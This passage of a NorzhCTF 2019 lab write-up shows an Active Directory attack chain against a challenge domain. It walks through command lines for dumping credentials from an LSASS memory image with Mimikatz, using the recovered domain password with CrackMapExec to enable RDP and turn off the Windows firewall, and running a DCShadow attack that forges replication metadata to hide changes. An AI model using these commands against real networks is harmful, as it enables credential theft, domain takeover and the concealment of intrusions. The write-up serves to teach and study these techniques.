+  ..                                  D        0  Wed Nov 28 14:57:22 2018
+  flag2.txt                           A      211  Wed Nov 28 14:56:56 2018
+  lsass.DMP                           A 31456493  Mon Nov 26 11:20:34 2018
+  scan_nmap_domain.txt                A     5120  Wed Nov 28 14:57:18 2018
+
+        10459647 blocks of size 4096. 5709473 blocks available
+</code></pre>
+
+<pre><code>smb: \Users\Administrator\Documents\Audit_20_12_2018_Confidentiel\&gt; get flag2.txt
+</code></pre>
+
+<pre><code>$ cat flag2.txt                                                             
+Well done ! Looks like you owned this first machine ! Here is the flag : ENSIBS{0x2adb3e_w1nt3r_1s_c0minG#}
+
+Road to domain p0wnage ! Your next flag should be hidden in domain admins private files, g00d luck !
+</code></pre>
+
+<p><br/></p>
+
+<h2 id="challenge-3-domain-control">Challenge 3 - Domain control</h2>
+
+<p>As indicated in the recovered text file, the next step is to compromise the entire domain.</p>
+
+<p><br/></p>
+
+<h3 id="getting-the-lsass-dump">Getting the LSASS dump</h3>
+
+<p>The first thing we can do is to get files in the audit directory. A port scan, not really useful in our case, but above all, a <code>lsass.dmp</code> file that seems much more important&hellip; Under Windows, the <code>lsass.exe</code> process is the element that manages the authentication of users (local or domain) on the system. The LSASS (Local Security Authority Subsystem Service) also stores connection information for active user sessions.</p>
+
+<pre><code>smb: \Users\Administrator\Documents\Audit_20_12_2018_Confidentiel\&gt; get lsass.DMP 
+getting file \Users\Administrator\Documents\Audit_20_12_2018_Confidentiel\lsass.DMP of size 31456493 as lsass.DMP (14149.8 KiloBytes/sec) (average 13647.0 KiloBytes/sec)
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="lsass-memory-analysis">LSASS memory analysis</h3>
+
+<p>Several methods exist to exploit the <code>lsass.exe</code> process to retrieve information. Generally, if the process dump was performed while users were connected to the machine, then the users&rsquo; login information will be found in the dump.</p>
+
+<p>The dump can be processed using the <strong>Mimikatz</strong> utility.</p>
+
+<p><center><img src="/img/writeups/norzhctf-2019/GoP_2_Mimikatz.gif" alt="Mimikatz GoP" class="imgSize"/></center></p>
+
+<p>The first command <code>sekurlsa::minidump lsass.DMP</code> is used to specify that we do not use the current <code>lsass.exe</code> process of the machine but a file containing a dump of the process memory. Thus, it is provided with the path of the file to be analyzed.</p>
+
+<p>The second command <code>sekurlsa::logonPasswords /full</code> is used to retrieve all user information stored in memory. Thus, we get the account of the user <strong>Jon Snow (jsnow)</strong> ! So we now have a privileged account&hellip; Let&rsquo;s pwn!</p>
+
+<p><br/></p>
+
+<h3 id="domain-controller-access-and-third-flag">Domain Controller access and third flag</h3>
+
+<p>In the same way as for the local administrator, it is possible to connect to the domain with our new user and see that we have high privileges ! This is visible among other things with <strong>CrackMapExec</strong> which indicates that we are the administrator of the machine (Pwn3d!).</p>
+
+<pre><code>$ cme smb 10.34.67.4 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot;
+SMB         10.34.67.4      445    DC01             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:DC01) (domain:NORZH) (signing:True) (SMBv1:True)
+SMB         10.34.67.4      445    DC01             [+] NORZH\jsnow::8n2K@j4hfUK#5Jek# (Pwn3d!)
+</code></pre>
+
+<p>As a reminder, the statement of the third challenge drives players to the private directories of the new user under attack. As for the second challenge, you can connect to the remote machines via <strong>smbclient</strong>. This time, we will target the <strong>C$</strong> (C: drive) of the domain controller.</p>
+
+<pre><code>$ smbclient -U jsnow //10.34.67.4/C$
+mkdir failed on directory /var/run/samba/msg.lock: Permission denied
+Unable to initialize messaging context
+Enter WORKGROUP\jsnow's password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt;
+</code></pre>
+
+<p>A few searches later, we find in the directory <code>C:\Users\jsnow\Documents</code> a file <code>flag3.txt</code> that we can then recover !</p>
+
+<pre><code>smb: \Users\jsnow\Documents\&gt; ls
+  .                                  DR        0  Wed Nov 28 15:10:50 2018
+  ..                                 DR        0  Wed Nov 28 15:10:50 2018
+  desktop.ini                       AHS      402  Sun Nov 25 19:36:45 2018
+  flag3.txt                           A      530  Wed Nov 28 15:10:55 2018
+  My Music                          DHS        0  Sun Nov 25 16:35:21 2018
+  My Pictures                       DHS        0  Sun Nov 25 16:35:21 2018
+  My Videos                         DHS        0  Sun Nov 25 16:35:21 2018
+
+        10395647 blocks of size 4096. 7661422 blocks available
+smb: \Users\jsnow\Documents\&gt; get flag3.txt 
+getting file \Users\jsnow\Documents\flag3.txt of size 530 as flag3.txt (258.8 KiloBytes/sec) (average 258.8 KiloBytes/sec)
+</code></pre>
+
+<p>This one contains the third flag of this scenario and guides you to the next step&hellip; With strange information!</p>
+
+<pre><code>&gt; $ cat flag3.txt                                                                                                                                             
+Wow ! Nice one ! Here is your third flag : ENSIBS{b3_Re@dy_f0r_sp0iLeRs_l1ttle_@dm1n!}
+
+What could you do now ? 
+The last step for you is to update the description of Daenerys Targaryen. What ? Easy you said ? ;)
+
+In order to work, you need to also set the following settings for the description modification : 
+
+Time : January, 1st 2017 at 9am
+UID : 00000000-0000-0000-0000-000000000000
+Usn : 42
+
+If you success into attacking this, the description of Jon Snow will be auto-updated with the last flag ! 
+
+Good luck !
+</code></pre>
+
+<p>Indeed, it is requested here to modify the description of the user <strong>Daenerys Targaryen</strong> so that this modification appears in the Active Directory as having been made on <code>01/01/2017</code> by the user with the UID <code>00000000-0000-0000-0000-0000-0000000000000000</code> and the USN <code>42</code>. There is no specific description&hellip; So you can put anything you want in it. Strange you say?</p>
+
+<p>It&rsquo;s time to RTFM then exploit !</p>
+
+<p><br/></p>
+
+<h2 id="challenge-4-replication-metadata">Challenge 4 - Replication metadata</h2>
+
+<p>After some research on the different parameters and user-related elements in an AD domain, we learn that the description is actually one of the different attributes. Changing any attribute of any object in an Active Directory domain produces what is called a replication metadata. This is information to identify the change made. This is generally used for replication between different domain controllers. The aim here is therefore to control these replication metadata when modifying the description&hellip;.</p>
+
+<p>Some research on the subject easily leads us to a relatively recent post-compromise attack (once the target has been compromised) allowing us to perform this type of action in order to hide our tracks, it is the <strong>DCShadow</strong> !</p>
+
+<p><br/></p>
+
+<h3 id="enabling-rdp">Enabling RDP</h3>
+
+<p>Several ways to achieve our goals&hellip; For simplicity and clarity&rsquo;s sake and since we need to access the client machine, RDP seems to be a good way.</p>
+
+<p>But&hellip; RDP is disabled on the client. No problem ! We&rsquo;re admins, we can do what we want! Thus, it can be activated in different ways. The <strong>CrackMapExec</strong> tool has, for example, a module to enable or disable RDP on a target.</p>
+
+<pre><code>$ sudo crackmapexec smb 10.69.88.23 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot; -M rdp -o ACTION=enable
+SMB         10.69.88.23     445    CLIENT01         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:CLIENT01) (domain:NORZH) (signing:False) (SMBv1:True)
+SMB         10.69.88.23     445    CLIENT01         [+] NORZH\jsnow::8n2K@j4hfUK#5Jek# (Pwn3d!)
+RDP         10.69.88.23     445    CLIENT01         [+] RDP enabled successfully
+
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="shutdown-windows-firewall">Shutdown Windows Firewall</h3>
+
+<p>The second important point is the firewall. Indeed, the search for information and resources on <strong>DCShadow</strong> teaches us that the Windows firewall must be disabled if we want to successfully exploit it.</p>
+
+<p>Once again, a whole bunch of ways to do it&hellip; In order to avoid using a meterpreter shell, I chose to do this by running a remote command with <strong>CrackMapExec</strong>. The <code>-x</code> option allows you to execute a command with <code>cmd.exe</code> while the <code>-X</code> option allows you to execute Powershell.</p>
+
+<p>In our case, we want to know the state of the firewall first. This can be done using the command <code>netsh advfirewall show allprofiles</code>.</p>
+
+<pre><code>$ sudo crackmapexec smb 10.69.88.23 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot; -x 'netsh advfirewall show allprofiles'
+SMB         10.69.88.23     445    CLIENT01         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:CLIENT01) (domain:NORZH) (signing:False) (SMBv1:True)
+SMB         10.69.88.23     445    CLIENT01         [+] NORZH\jsnow::8n2K@j4hfUK#5Jek# (Pwn3d!)
+SMB         10.69.88.23     445    CLIENT01         [+] Executed command 
+SMB         10.69.88.23     445    CLIENT01         Domain Profile Settings:
+SMB         10.69.88.23     445    CLIENT01         ----------------------------------------------------------------------
+SMB         10.69.88.23     445    CLIENT01         State                                 ON
+SMB         10.69.88.23     445    CLIENT01         Firewall Policy                       BlockInbound,AllowOutbound
+SMB         10.69.88.23     445    CLIENT01         LocalFirewallRules                    N/A (GPO-store only)
+SMB         10.69.88.23     445    CLIENT01         LocalConSecRules                      N/A (GPO-store only)
+SMB         10.69.88.23     445    CLIENT01         InboundUserNotification               Enable
+SMB         10.69.88.23     445    CLIENT01         RemoteManagement                      Disable
+SMB         10.69.88.23     445    CLIENT01         UnicastResponseToMulticast            Enable
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         Logging:
+SMB         10.69.88.23     445    CLIENT01         LogAllowedConnections                 Disable
+SMB         10.69.88.23     445    CLIENT01         LogDroppedConnections                 Disable
+SMB         10.69.88.23     445    CLIENT01         FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+SMB         10.69.88.23     445    CLIENT01         MaxFileSize                           4096
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         Private Profile Settings:
+SMB         10.69.88.23     445    CLIENT01         ----------------------------------------------------------------------
+SMB         10.69.88.23     445    CLIENT01         State                                 ON
+SMB         10.69.88.23     445    CLIENT01         Firewall Policy                       BlockInbound,AllowOutbound
+SMB         10.69.88.23     445    CLIENT01         LocalFirewallRules                    N/A (GPO-store only)
+SMB         10.69.88.23     445    CLIENT01         LocalConSecRules                      N/A (GPO-store only)
+SMB         10.69.88.23     445    CLIENT01         InboundUserNotification               Enable
+SMB         10.69.88.23     445    CLIENT01         RemoteManagement                      Disable
+SMB         10.69.88.23     445    CLIENT01         UnicastResponseToMulticast            Enable
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         Logging:
+SMB         10.69.88.23     445    CLIENT01         LogAllowedConnections                 Disable
+SMB         10.69.88.23     445    CLIENT01         LogDroppedConnections                 Disable
+SMB         10.69.88.23     445    CLIENT01         FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+SMB         10.69.88.23     445    CLIENT01         MaxFileSize                           4096
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         Public Profile Settings:
+SMB         10.69.88.23     445    CLIENT01         ----------------------------------------------------------------------
+SMB         10.69.88.23     445    CLIENT01         State                                 ON
+SMB         10.69.88.23     445    CLIENT01         Firewall Policy                       BlockInbound,AllowOutbound
+SMB         10.69.88.23     445    CLIENT01         LocalFirewallRules                    N/A (GPO-store only)
+SMB         10.69.88.23     445    CLIENT01         LocalConSecRules                      N/A (GPO-store only)
+SMB         10.69.88.23     445    CLIENT01         InboundUserNotification               Enable
+SMB         10.69.88.23     445    CLIENT01         RemoteManagement                      Disable
+SMB         10.69.88.23     445    CLIENT01         UnicastResponseToMulticast            Enable
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         Logging:
+SMB         10.69.88.23     445    CLIENT01         LogAllowedConnections                 Disable
+SMB         10.69.88.23     445    CLIENT01         LogDroppedConnections                 Disable
+SMB         10.69.88.23     445    CLIENT01         FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+SMB         10.69.88.23     445    CLIENT01         MaxFileSize                           4096
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         Ok.
+
+</code></pre>
+
+<p>All profiles are therefore activated. Okay, now, we&rsquo;re going to disable all the firewall profiles to avoid any problems. This is done with the command <code>netsh advfirewall set allprofiles state off</code>.</p>
+
+<pre><code>$ sudo crackmapexec smb 10.69.88.23 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot; -x 'netsh advfirewall set allprofiles state off'
+SMB         10.69.88.23     445    CLIENT01         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:CLIENT01) (domain:NORZH) (signing:False) (SMBv1:True)
+SMB         10.69.88.23     445    CLIENT01         [+] NORZH\jsnow::8n2K@j4hfUK#5Jek# (Pwn3d!)
+SMB         10.69.88.23     445    CLIENT01         [+] Executed command 
+
+</code></pre>
+
+<p>A small check, to make sure that the command ran successfully and had the desired actions.</p>
+
+<pre><code>$ sudo crackmapexec smb 10.69.88.23 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot; -x 'netsh advfirewall show allprofiles' 
+SMB         10.69.88.23     445    CLIENT01         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:CLIENT01) (domain:NORZH) (signing:False) (SMBv1:True)
+SMB         10.69.88.23     445    CLIENT01         [+] NORZH\jsnow::8n2K@j4hfUK#5Jek# (Pwn3d!)
+SMB         10.69.88.23     445    CLIENT01         [+] Executed command 
+SMB         10.69.88.23     445    CLIENT01         Domain Profile Settings:
+SMB         10.69.88.23     445    CLIENT01         ----------------------------------------------------------------------
+SMB         10.69.88.23     445    CLIENT01         State                                 OFF
+SMB         10.69.88.23     445    CLIENT01         Firewall Policy                       BlockInbound,AllowOutbound
+SMB         10.69.88.23     445    CLIENT01         LocalFirewallRules                    N/A (GPO-store only)
+SMB         10.69.88.23     445    CLIENT01         LocalConSecRules                      N/A (GPO-store only)
+SMB         10.69.88.23     445    CLIENT01         InboundUserNotification               Enable
+SMB         10.69.88.23     445    CLIENT01         RemoteManagement                      Disable
+SMB         10.69.88.23     445    CLIENT01         UnicastResponseToMulticast            Enable
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         Logging:
+SMB         10.69.88.23     445    CLIENT01         LogAllowedConnections                 Disable
+SMB         10.69.88.23     445    CLIENT01         LogDroppedConnections                 Disable
+SMB         10.69.88.23     445    CLIENT01         FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+SMB         10.69.88.23     445    CLIENT01         MaxFileSize                           4096
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         Private Profile Settings:
+SMB         10.69.88.23     445    CLIENT01         ----------------------------------------------------------------------
+SMB         10.69.88.23     445    CLIENT01         State                                 OFF
+SMB         10.69.88.23     445    CLIENT01         Firewall Policy                       BlockInbound,AllowOutbound
+SMB         10.69.88.23     445    CLIENT01         LocalFirewallRules                    N/A (GPO-store only)
+SMB         10.69.88.23     445    CLIENT01         LocalConSecRules                      N/A (GPO-store only)
+SMB         10.69.88.23     445    CLIENT01         InboundUserNotification               Enable
+SMB         10.69.88.23     445    CLIENT01         RemoteManagement                      Disable
+SMB         10.69.88.23     445    CLIENT01         UnicastResponseToMulticast            Enable
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         Logging:
+SMB         10.69.88.23     445    CLIENT01         LogAllowedConnections                 Disable
+SMB         10.69.88.23     445    CLIENT01         LogDroppedConnections                 Disable
+SMB         10.69.88.23     445    CLIENT01         FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+SMB         10.69.88.23     445    CLIENT01         MaxFileSize                           4096
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         Public Profile Settings:
+SMB         10.69.88.23     445    CLIENT01         ----------------------------------------------------------------------
+SMB         10.69.88.23     445    CLIENT01         State                                 OFF
+SMB         10.69.88.23     445    CLIENT01         Firewall Policy                       BlockInbound,AllowOutbound
+SMB         10.69.88.23     445    CLIENT01         LocalFirewallRules                    N/A (GPO-store only)
+SMB         10.69.88.23     445    CLIENT01         LocalConSecRules                      N/A (GPO-store only)
+SMB         10.69.88.23     445    CLIENT01         InboundUserNotification               Enable
+SMB         10.69.88.23     445    CLIENT01         RemoteManagement                      Disable
+SMB         10.69.88.23     445    CLIENT01         UnicastResponseToMulticast            Enable
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         Logging:
+SMB         10.69.88.23     445    CLIENT01         LogAllowedConnections                 Disable
+SMB         10.69.88.23     445    CLIENT01         LogDroppedConnections                 Disable
+SMB         10.69.88.23     445    CLIENT01         FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+SMB         10.69.88.23     445    CLIENT01         MaxFileSize                           4096
+SMB         10.69.88.23     445    CLIENT01         
+SMB         10.69.88.23     445    CLIENT01         Ok.
+
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="rdp-connection">RDP Connection</h3>
+
+<p>Everything seems ready for exploitation ! We can therefore start by connecting in RDP to the client machine. I use the <strong>remmina</strong> tool because it allows to set up a folder shared between the attacking machine and the target of the RDP connection. We will see that this is particularly useful in our case.</p>
+
+<p><center><img src="/img/writeups/norzhctf-2019/GoP_3_remmina.png" alt="Connexion RDP" class="imgSize"/></center></p>
+
+<p><br/></p>
+
+<h3 id="dc-shadow-exploitation">DC Shadow exploitation</h3>
+
+<p>The exploitation of the <strong>DCShadow</strong> attack can be done with <strong>Mimikatz</strong>. To do this, we will bring a version of the tool to the target machine through the shared folder created previously. So we can execute it directly from here.</p>
+
+<p>The attack is carried out in several stages:</p>
+
+<ul>
+<li>Preparation of the data to be modified then creation of a fake domain controller (simulation) using mimikatz ;</li>
+<li>Registration of the false DC in the target infrastructure, which causes replication between the legitimate DC and our false DC and consequently, validation of the data injected;</li>
+<li>Unregistration of illegitimate DC.</li>
+</ul>
+
+<p>Thus, 2 <strong>Mimikatz</strong> terminals are required. Important point, it is necessary to run mimikatz as an administrator to have the necessary rights and to succeed in the attack.</p>
+
+<p>The first terminal is used to register the fake domain controller, using the following commands;</p>
+
+<pre><code># Driver loading to bypass restrictions and allow interactions with LSASS
+mimikatz # !+
+
+# Process elevation to SYSTEM (no token::elevate because it doesn't apply to a thread)
+mimikatz # !processtoken
+
+# Using lsadump module to start the fake DC and prepare injection
+mimikatz # lsadump::dcshadow /object:dtargaryen /attribute:description /value:&quot;TheGame&quot; /replOriginatingUid:{00000000-0000-0000-0000-000000000000} /replOriginatingTime:&quot;2017-01-01 09:00:00&quot; /replOriginatingUsn:42
+</code></pre>
+
+<p>The second terminal is used to push the desired data on the real domain using replication.</p>
+
+<pre><code># Using lsadump module to push modifications on the domain
+mimikatz # lsadump::dcshadow /push
+</code></pre>
+
+<p>The following picture illustrates the attack on the client machine and the result obtained. A &ldquo;Sync Done&rdquo; message followed by the unregistration of the fake controller seems to indicate the success of the attack.</p>
+
+<p><center><img src="/img/writeups/norzhctf-2019/GoP_4_DCShadow.png" alt="DCShadow GoP" class="imgSize"/></center></p>
+
+<p><br/></p>
+
+<h3 id="validation-and-getting-the-last-flag">Validation and getting the last flag</h3>
+
+<p>In order to check if the new description and metadata have been pushed, the <strong>repadmin</strong> utility can be used on the domain controller. Thus, we will ask to display replication metadata for the different attributes of the user <strong>Daenerys Targaryen</strong>. This can be done by running repadmin via crackmapexec.</p>
+
+<pre><code>sudo ./cme smb 10.34.67.4 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot; -x 'repadmin /showobjmeta DC01.NORZH.LAN &quot;CN=Daenerys Targaryen,CN=Users,DC=NORZH,DC=LAN&quot;'
+SMB         10.34.67.4      445    DC01             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:DC01) (domain:NORZH) (signing:True) (SMBv1:True)
+SMB         10.34.67.4      445    DC01             [+] NORZH\jsnow::8n2K@j4hfUK#5Jek# (Pwn3d!)
+SMB         10.34.67.4      445    DC01             [+] Executed command 
+SMB         10.34.67.4      445    DC01             27 entries.
+SMB         10.34.67.4      445    DC01             Loc.USN                           Originating DSA  Org.USN  Org.Time/Date        Ver Attribute
+SMB         10.34.67.4      445    DC01             =======                           =============== ========= =============        === =========
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 objectClass
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 cn
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 sn
+SMB         10.34.67.4      445    DC01             102469      00000000-0000-0000-0000-000000000000        42 2017-01-01 09:00:00    2 description
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 givenName
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 instanceType
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 whenCreated
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 displayName
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 nTSecurityDescriptor
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 name
+SMB         10.34.67.4      445    DC01             12741              Default-First-Site-Name\DC01     12741 2018-11-25 16:31:16    4 userAccountControl
+SMB         10.34.67.4      445    DC01             12737              Default-First-Site-Name\DC01     12737 2018-11-25 16:31:16    1 codePage
+SMB         10.34.67.4      445    DC01             12737              Default-First-Site-Name\DC01     12737 2018-11-25 16:31:16    1 countryCode
+SMB         10.34.67.4      445    DC01             12738              Default-First-Site-Name\DC01     12738 2018-11-25 16:31:16    2 dBCSPwd
+SMB         10.34.67.4      445    DC01             12737              Default-First-Site-Name\DC01     12737 2018-11-25 16:31:16    1 logonHours
+SMB         10.34.67.4      445    DC01             12738              Default-First-Site-Name\DC01     12738 2018-11-25 16:31:16    2 unicodePwd
+SMB         10.34.67.4      445    DC01             12738              Default-First-Site-Name\DC01     12738 2018-11-25 16:31:16    2 ntPwdHistory
+SMB         10.34.67.4      445    DC01             12738              Default-First-Site-Name\DC01     12738 2018-11-25 16:31:16    2 pwdLastSet
+SMB         10.34.67.4      445    DC01             12737              Default-First-Site-Name\DC01     12737 2018-11-25 16:31:16    1 primaryGroupID
+SMB         10.34.67.4      445    DC01             12739              Default-First-Site-Name\DC01     12739 2018-11-25 16:31:16    1 supplementalCredentials
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 objectSid
+SMB         10.34.67.4      445    DC01             12737              Default-First-Site-Name\DC01     12737 2018-11-25 16:31:16    1 accountExpires
+SMB         10.34.67.4      445    DC01             12738              Default-First-Site-Name\DC01     12738 2018-11-25 16:31:16    2 lmPwdHistory
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 sAMAccountName
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 sAMAccountType
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 userPrincipalName
+SMB         10.34.67.4      445    DC01             12736              Default-First-Site-Name\DC01     12736 2018-11-25 16:31:16    1 objectCategory
+SMB         10.34.67.4      445    DC01             0 entries.
+SMB         10.34.67.4      445    DC01             Type    Attribute     Last Mod Time                            Originating DSA  Loc.USN Org.USN Ver
+SMB         10.34.67.4      445    DC01             ======= ============  =============                           ================= ======= ======= ===
+SMB         10.34.67.4      445    DC01             Distinguished Name
+SMB         10.34.67.4      445    DC01             =============================
+
+</code></pre>
+
+<p>Thus, we see that the modification has been made and that the requested metadata has been injected. Perfect ! This indicates that everything worked ! The statement of this challenge indicates that if the exploitation was successful, then the user description <strong>Jon Snow (jsnow)</strong> should have been replaced by the flag. We wait a few minutes and then go check out the user !</p>
+
+<pre><code>rpcclient $&gt; queryuser 0x451
+    User Name   :   jsnow
+    Full Name   :   Jon Snow
+    Home Drive  :   
+    Dir Drive   :   
+    Profile Path:   
+    Logon Script:   
+    Description :   ENSIBS{F33l_Th3_P0wer_0f_DCSh4d0w}
+    Workstations:   
+    Comment     :   
+    Remote Dial :
+    Logon Time               :  Sun, 27 Jan 2019 20:37:45 CET
+    Logoff Time              :  Thu, 01 Jan 1970 01:00:00 CET
+    Kickoff Time             :  Thu, 14 Sep 30828 04:48:05 CEST
+    Password last set Time   :  Sun, 25 Nov 2018 16:28:20 CET
+    Password can change Time :  Mon, 26 Nov 2018 16:28:20 CET
+    Password must change Time:  Thu, 14 Sep 30828 04:48:05 CEST
+    unknown_2[0..31]...
+    user_rid :  0x451
+    group_rid:  0x200
+    acb_info :  0x00000210
+    fields_present: 0x00ffffff
+    logon_divs: 168
+    bad_password_count: 0x00000000
+    logon_count:    0x00000041
+    padding1[0..7]...
+    logon_hrs[0..21]...
+</code></pre>
+
+<p>B00m! Last flag caught! Total control of the domain and tracks that can be deleted, but also the end of this story.</p>
+
+<p><br/></p>
+
+<h2 id="feedback-and-last-word">Feedback and last word</h2>
+
+<p>This paragraph is a kind of personal feedback on the challenge, as we designed it for NorzhCTF with the idea in mind to create a Windows infrastructures based scenario challenge. With a few days of hindsight and some feedback, several elements and errors can be reported:</p>
+
+<ul>
+<li>The discovery aspect of DC, on another LAN, had initially not been taken into account because the challenge was created on a single LAN. This added an unexpected complexity step and a 5th flag could have been placed here;</li>
+<li>The use of so-called &ldquo;private&rdquo; files in the local administrator&rsquo;s directories and then on the domain controller slightly alters the realism of the scenario since, in reality, it is rare to find any files here. Nevertheless, we needed a way to place the flags and statements in one place;</li>
+<li>Some statements, such as the DC Shadow statement, may not be clear.</li>
+</ul>
+
+<p>We are nevertheless happy to have achieved this challenge and hope that all participants appreciated it !</p>
+
+<p>Feel free to send us your feedback or questions, if necessary, via Twitter (<a href="https://twitter.com/Haaxmax" target="blank">@Haaxmax</a> and <a href="https://twitter.com/AzrakelK" target="blank">@AzrakelK</a>). For people wishing to redo the challenge, it should also be possible to give you the virtual machines, on a case-by-case basis.</p>
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/en/writeups/santhacklausctf-2018/santhacklaus-ctf/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">Santhacklaus CTF 2018 - Solved Challenges</span>
+    </a>
+    
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-126182747-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
